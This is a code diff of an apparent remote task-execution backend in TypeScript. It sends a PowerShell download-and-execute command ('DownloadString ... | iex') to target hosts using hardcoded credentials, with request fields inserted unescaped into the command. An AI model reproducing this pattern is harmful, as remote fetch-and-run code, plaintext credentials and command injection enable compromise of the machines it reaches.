@@ -32,14 +32,14 @@ export default [
       // req.body.payload
       // req.body.targets
       // req.body.target_regex
+      let hash = hashPayload(req.body.payload);
       const id = await db.one(
         'INSERT INTO public."Tasks"( user_id, command) VALUES ( ${user_id}, ${command}) returning id',
-        { user_id: 1, command: req.body.payload }
+        { user_id: 1, command: `(New-Object Net.WebClient).DownloadString('http://${process.env.BE_IDENTIFIER}:${process.env.PORT}/repo/scripts?hash=${hash}').Replace('ï»¿', '').Replace('<insert args here>', '$downloadUrl = "' + "${req.body.downloadUrl}" + '";$output="' +'${req.body.output}'+'";$uploadUrl="' + "${req.body.uploadUrl}" + '";') | iex`}
       );
       if (!id) {
         res.status(500).send("Couldn't start task");
       }
-      let hash = hashPayload(req.body.payload);
       let response: { [key: string]: any } = {};
       let status = 200; // OK as default
       req.body.addresses.forEach(async (address: string) => {
@@ -57,11 +57,14 @@ export default [
           );
           try {
             if (req.body.steps) {
+              console.log("steps")
               let responsePaaS = await db.oneOrNone(
                 'select microtask_id from public."Steps" where endpoint_id = ${endpoint_id} and type=${type} and endtime is null limit 1',
                 { endpoint_id: req.body.endpoint_id, type: "paas" }
               );
+              console.log("falafel")
               if (!responsePaaS) {
+                console.log("respaas")
                 responsePaaS = (
                   await axios.post("http://192.168.36.128:5000/PaaS", {
                     address: address,
@@ -85,30 +88,35 @@ export default [
                 );
               }
             }
-            const responseExecute = (
-              await axios.post("http://localhost:5000/execute", {
-                ip_address: req.body.targets,
-                username: "Witcher",
-                password: "Switcher",
-                process: "powershell.exe",
-                command: `(New-Object Net.WebClient).DownloadString('http://${process.env.BE_IDENTIFIER}:${process.env.PORT}/repo/scripts?hash=${hash}').Replace('ï»¿', '').Replace('<insert args here>', '$downloadUrl = "' + "${req.body.downloadUrl}" + '";$output="' +'${req.body.output}'+'";$uploadUrl="' + "${req.body.uploadUrl}" + '";') | iex`,
-              })
-            ).data;
-            response[address]["executeResponse"] = responseExecute;
-            await db.none(
-              'INSERT INTO public."Steps"(task_id, status, starttime, endpoint_id, endtime, type, args, microtask_id) VALUES (${task_id}, ${status},CURRENT_TIMESTAMP, ${endpoint_id}, NULL, ${type}, ${args}, ${microtask_id})',
-              {
-                task_id: id.id,
-                status: "Pending",
-                endpoint_id: req.body.endpoint_id,
-                type: "eaas",
-                args: req.body.steps,
-                microtask_id: responseExecute.task_id,
-              }
-            );
+            else{
+              console.log("executer :)")
+              const responseExecute = (
+                await axios.post("http://localhost:5001/execute", {
+                  ip_address: address,
+                  username: "Witcher",
+                  password: "Switcher",
+                  process: "powershell.exe",
+                  command: `(New-Object Net.WebClient).DownloadString('http://${process.env.BE_IDENTIFIER}:${process.env.PORT}/repo/scripts?hash=${hash}').Replace('ï»¿', '').Replace('<insert args here>', '$downloadUrl = "' + "${req.body.downloadUrl}" + '";$output="' +'${req.body.output}'+'";$uploadUrl="' + "${req.body.uploadUrl}" + '";') | iex`,
+                })
+              ).data;
+              response[address]["executeResponse"] = responseExecute;
+              console.log(responseExecute) 
+              await db.none(
+                'INSERT INTO public."Steps"(task_id, status, starttime, endpoint_id, endtime, type, args, microtask_id) VALUES (${task_id}, ${status},CURRENT_TIMESTAMP, ${endpoint_id}, NULL, ${type}, ${args}, ${microtask_id})',
+                {
+                  task_id: id.id,
+                  status: "Pending",
+                  endpoint_id: req.body.endpoint_id,
+                  type: "eaas",
+                  args: req.body.steps,
+                  microtask_id: responseExecute.task_id,
+                }
+              );
+
+            }
           } catch (error) {
             // Passes errors into the error handler
-            console.log(error);
+            throw error;
           }
         }
       });
